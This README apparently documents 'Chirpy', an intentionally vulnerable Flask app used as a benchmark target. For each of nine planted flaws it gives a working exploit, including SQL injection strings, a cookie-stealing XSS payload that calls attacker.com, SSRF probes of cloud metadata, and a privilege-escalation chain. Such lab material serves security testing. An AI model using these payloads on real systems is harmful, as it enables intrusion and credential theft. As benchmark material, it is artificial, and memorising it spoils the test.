# Chirpy — Intentionally Vulnerable Target App

Chirpy is a deliberately insecure micro-blogging platform built as a benchmark target for security testing tools and AI agents.

> **Warning:** This application contains intentional security vulnerabilities. Run it only in an isolated, local environment. Never expose it to the public internet.

---

## Setup

**Requirements:** Docker and Docker Compose.

```bash
# Clone the repo
git clone https://github.com/ctfjake/violet-target.git
cd violet-target

# Start the app
docker compose up -d

# App is now running at http://localhost:5001
```

### Reset to clean state

```bash
# Wipe the database volume and restart fresh
docker compose down -v && docker compose up -d
```

---

## Seed Accounts

| Username | Password | Role  |
|----------|----------|-------|
| admin    | admin    | admin |
| alice    | password123 | user |
| bob      | 123456   | user  |

---

## Vulnerabilities

### 1. SQL Injection — Authentication Bypass

**Endpoint:** `POST /login`

The login query is built via string interpolation, allowing an attacker to manipulate the SQL logic and log in as any user without knowing their password.

**Exploit:**

In the login form, enter:
- **Username:** `admin'--`
- **Password:** *(anything)*

This produces the query:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
```
The `--` comments out the password check, granting access as `admin`.

---

### 2. SQL Injection — Data Extraction

**Endpoint:** `GET /search?q=`

The search query is also interpolated directly, enabling `UNION`-based data extraction.

**Exploit:**

Navigate to:
```
http://localhost:5001/search?q=x' UNION SELECT id,username,password,role,bio FROM users--
```

This injects a second `SELECT` that dumps the users table (including plaintext passwords) into the search results.

---

### 3. Stored XSS

**Endpoint:** `POST /post/<id>/comment`

Comment content is stored in the database and rendered without escaping using Jinja2's `| safe` filter. Any HTML/JavaScript in a comment executes in the browser of anyone who views the post.

**Exploit:**

On any post's comment form, submit:
```html
<script>alert('XSS')</script>
```

Or for a more impactful payload (cookie theft):
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

Post content itself is also rendered unsanitized via `| safe`.

---

### 4. Reflected XSS

**Endpoint:** `GET /search?q=`

The search query is reflected directly into the page as `Markup()`, bypassing Jinja2's auto-escaping.

**Exploit:**

Navigate to:
```
http://localhost:5001/search?q=<script>alert('XSS')</script>
```

The script tag is rendered and executed immediately. This URL can be sent to a victim to execute arbitrary JavaScript in their browser.

---

### 5. Insecure Direct Object Reference (IDOR)

**Endpoint:** `GET /post/<id>`

Private posts are marked with `is_private = 1` but the route performs no ownership check — any authenticated user can view any post by iterating the `id` parameter.

**Exploit:**

1. Log in as `bob` (or any non-admin account).
2. Navigate to `http://localhost:5001/post/2` — alice's private post containing sensitive information.

---

### 6. Broken Access Control — Missing Ownership Check

**Endpoint:** `POST /post/<id>/delete`

The delete route only checks that the user is logged in. It does not verify that the requesting user owns the post.

**Exploit:**

1. Log in as `bob`.
2. Send a POST request to delete alice's post:

```bash
curl -X POST http://localhost:5001/post/1/delete \
  -b "session=<bob's session cookie>"
```

Or simply click the **Delete** button visible on any post while logged in as any user.

---

### 7. Privilege Escalation — Mass Assignment

**Endpoint:** `POST /profile/update`

The profile update endpoint accepts a `role` field from the request body and writes it directly to the database. Any user can promote themselves to admin.

**Exploit:**

While logged in as a regular user, send:

```bash
curl -X POST http://localhost:5001/profile/update \
  -b "session=<your session cookie>" \
  -d "bio=hacked&role=admin"
```

Then navigate to `http://localhost:5001/admin` — access is now granted, exposing all users and their plaintext passwords.

---

### 8. Weak Authentication

Several authentication weaknesses exist simultaneously:

- **Default credentials:** `admin` / `admin`
- **Plaintext password storage:** Passwords are stored as-is in SQLite with no hashing. Visible in the admin panel and extractable via SQL injection.
- **No rate limiting:** The login endpoint accepts unlimited attempts, enabling brute-force attacks.
- **Hardcoded secret key:** Flask's `secret_key` is hardcoded as `chirpy_secret_2024`, allowing session forgery if an attacker knows it.

**Exploit:**

Log in with `admin` / `admin` directly. Or extract all passwords via the SQL injection in `/search` and use them to log in.

---

### 9. Server-Side Request Forgery (SSRF)

**Endpoint:** `GET /fetch?url=`

The "Link Preview" feature fetches a user-supplied URL server-side with no allowlist or internal-IP filtering. An attacker can use the server as a proxy to reach internal services.

**Exploits:**

Probe internal services:
```
http://localhost:5001/fetch?url=http://127.0.0.1:5000/admin
```

Cloud metadata endpoint (AWS IMDSv1):
```
http://localhost:5001/fetch?url=http://169.254.169.254/latest/meta-data/
```

Internal network scanning:
```
http://localhost:5001/fetch?url=http://192.168.1.1/
```

---

## Attack Chain Example

A full compromise from zero to admin in three steps:

1. **Enumerate private posts** via IDOR: visit `/post/2` while logged in as any user.
2. **Escalate to admin** via mass assignment: POST `role=admin` to `/profile/update`.
3. **Dump all credentials** from the admin panel at `/admin` (passwords shown in plaintext).

---

## File Structure

```
.
├── app.py              # Flask application (all routes and vulnerability code)
├── templates/          # Jinja2 HTML templates
├── static/style.css    # Stylesheet
├── requirements.txt
├── Dockerfile
└── docker-compose.yml
```
